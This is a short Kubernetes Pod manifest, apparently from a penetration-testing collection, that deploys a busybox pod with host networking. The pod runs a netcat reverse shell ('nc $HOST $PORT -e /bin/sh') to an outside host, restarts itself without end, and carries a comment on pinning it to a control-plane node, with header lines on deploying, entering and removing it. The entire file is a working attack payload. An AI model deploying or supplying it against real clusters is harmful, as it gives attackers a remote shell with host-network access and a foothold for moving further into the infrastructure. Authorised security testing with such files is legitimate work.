###########################################################
## Deploy: kubectl -n [namespace] apply -f pod-hostnetwork-revshell.yaml 
## Access: kubectl -n [namespace] exec -it pod-hostnetwork-revshell -- bash
## Remove: kubectl -n [namespace] delete pod-hostnetwork-revshell
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostnetwork-revshell
  labels:
    app: pentest
spec:
  hostNetwork: true
  containers:
  - image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    name: hostnetwork-revshell
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
  restartPolicy: Always
